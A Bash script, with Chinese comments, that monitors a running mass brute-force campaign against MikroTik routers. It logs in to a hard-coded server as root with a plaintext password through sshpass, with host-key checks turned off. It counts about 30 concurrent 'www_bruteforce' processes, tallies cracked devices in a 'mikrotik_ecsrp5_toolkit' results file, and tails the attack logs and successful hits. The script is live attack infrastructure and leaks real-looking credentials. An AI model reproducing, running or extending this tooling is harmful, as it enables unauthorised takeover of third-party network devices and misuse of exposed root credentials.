#!/bin/bash
# MikroTik爆破进度监控

TARGET_IP="82.29.71.156"
TARGET_USER="root"
TARGET_PASS='@admin123'

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

clear
echo -e "${GREEN}═══════════════════════════════════════════════════${NC}"
echo -e "${GREEN}    MikroTik 批量爆破 - 实时进度${NC}"
echo -e "${GREEN}═══════════════════════════════════════════════════${NC}"
echo ""

# Screen状态
echo -e "${CYAN}[Screen会话]${NC}"
sshpass -p "${TARGET_PASS}" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ${TARGET_USER}@${TARGET_IP} 'screen -list' 2>/dev/null

echo ""
echo -e "${CYAN}[运行状态]${NC}"
PROCS=$(sshpass -p "${TARGET_PASS}" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ${TARGET_USER}@${TARGET_IP} 'ps aux | grep www_bruteforce | grep -v grep | wc -l' 2>/dev/null)
echo -e "  并发进程: ${GREEN}${PROCS}${NC}/30"

LOAD=$(sshpass -p "${TARGET_PASS}" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ${TARGET_USER}@${TARGET_IP} 'uptime | awk -F"average:" "{print \$2}"' 2>/dev/null)
echo -e "  系统负载:${LOAD}"

# 成功数
NEW=$(sshpass -p "${TARGET_PASS}" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ${TARGET_USER}@${TARGET_IP} 'cat /root/mikrotik_ecsrp5_toolkit/results/fixed_final_success.txt 2>/dev/null | wc -l' 2>/dev/null)
TOTAL=$(sshpass -p "${TARGET_PASS}" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ${TARGET_USER}@${TARGET_IP} 'find /root/mikrotik_ecsrp5_toolkit/results/ -type f -exec cat {} \; 2>/dev/null | sort -u | wc -l' 2>/dev/null)
echo -e "  新发现: ${GREEN}${NEW}${NC} 个 | 总计: ${GREEN}${TOTAL}${NC} 个"

echo ""
echo -e "${YELLOW}[最新日志]${NC}"
sshpass -p "${TARGET_PASS}" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ${TARGET_USER}@${TARGET_IP} 'tail -25 /root/mikrotik_ecsrp5_toolkit/fixed_final.log 2>/dev/null' 2>/dev/null

echo ""
echo -e "${GREEN}[最新成功]${NC}"
sshpass -p "${TARGET_PASS}" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ${TARGET_USER}@${TARGET_IP} 'tail -15 /root/mikrotik_ecsrp5_toolkit/results/fixed_final_success.txt 2>/dev/null' 2>/dev/null

echo ""
echo -e "${BLUE}[提示]${NC}"
echo "  实时监控: watch -n 5 ./check_progress.sh"
echo "  进入screen: ssh root@82.29.71.156 -t 'screen -r 1111161.mikrotik_brute'"
echo "  查看日志: ssh root@82.29.71.156 'tail -f /root/mikrotik_ecsrp5_toolkit/fixed_final.log'"
